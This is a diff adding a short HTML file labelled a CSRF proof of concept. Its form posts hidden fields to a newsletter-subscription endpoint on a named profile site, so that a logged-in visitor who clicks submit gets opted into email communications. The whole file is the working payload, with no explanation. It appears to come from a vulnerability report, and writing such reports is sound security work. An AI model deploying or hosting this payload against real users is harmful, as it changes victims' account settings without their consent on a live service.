@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>CSRF Proof of Concept</h3>
+    <form action="https://profil.monxtra.be/manage-profile/newsletters/dats24?_data=routes%2Fmanage-profile%2B%2Fnewsletters%2B%2F%24commerceId%2Findex" method="POST">
+      <input type="hidden" name="hasAccepted" value="on">
+      <input type="hidden" name="communicationChannelId" value="1228">
+      <input type="hidden" name="communicationChannelType" value="EMAIL">
+      <input type="hidden" name="hasValidAddress" value="true">
+      <input type="hidden" name="isRobinsonMail" value="false">
+      <input type="submit" value="Submit CSRF Request">
+    </form>
+  </body>
+</html>
